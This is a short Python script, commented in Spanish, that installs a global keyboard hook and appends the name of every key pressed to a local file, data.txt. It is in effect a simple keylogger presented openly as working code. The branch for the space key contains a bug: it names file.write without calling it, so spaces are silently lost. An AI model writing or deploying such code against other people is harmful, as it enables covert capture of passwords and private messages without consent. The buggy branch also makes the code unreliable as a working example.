##Creacion de un codigo que permite almacenar el teclado por consola
import keyboard

def botonesPresionados(boton):


    with open('data.txt','a') as file:
        if boton.name == 'space':
            file.write

        else:
            file.write(boton.name)


keyboard.on_press(botonesPresionados)
keyboard.wait()